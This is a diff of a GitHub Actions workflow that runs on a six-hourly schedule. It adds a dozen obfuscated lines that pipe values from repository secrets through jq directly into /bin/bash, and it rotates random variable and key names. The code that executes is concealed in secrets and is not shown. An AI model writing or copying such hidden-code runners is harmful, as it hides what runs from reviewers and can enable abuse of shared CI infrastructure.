@@ -3,19 +3,26 @@ name: caidefine
 on:
   workflow_dispatch:
   schedule:
-    - cron: '24 2/6 * * *'
-jobs:  # 29035
+    - cron: '39 2/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: caidefine
         env:
-          ylm6: ${{ secrets.ylm6 }}
+          c34: ${{ secrets.c34 }}
         run: |
-          echo $ylm6 | jq -r .fa68 | /bin/bash
-          echo $zsf61 | jq -r .orijw32029 | /bin/bash
-          echo $h01130 | jq -r .yqkpj1 | /bin/bash
-          echo $dgw14 | jq -r .hlyeb48 | /bin/bash
+          echo $c34 | jq -r .rvl0 | /bin/bash
+          echo $nrmsj946 | jq -r .tj571 | /bin/bash
+          echo $xsa1091 | jq -r .rkuty97 | /bin/bash
+          echo $szkl9 | jq -r .zpm5 | /bin/bash
+          echo $ev1 | jq -r .bwnu7 | /bin/bash
+          echo $zkt0 | jq -r .h08 | /bin/bash
+          echo $zgtq7185 | jq -r .ryjhg3282 | /bin/bash
+          echo $gkm3618 | jq -r .beyu15679 | /bin/bash
+          echo $aeku56004 | jq -r .dyccj08 | /bin/bash
+          echo $sn84 | jq -r .ybwp5769 | /bin/bash
+          echo $kh42205 | jq -r .nx7 | /bin/bash
 
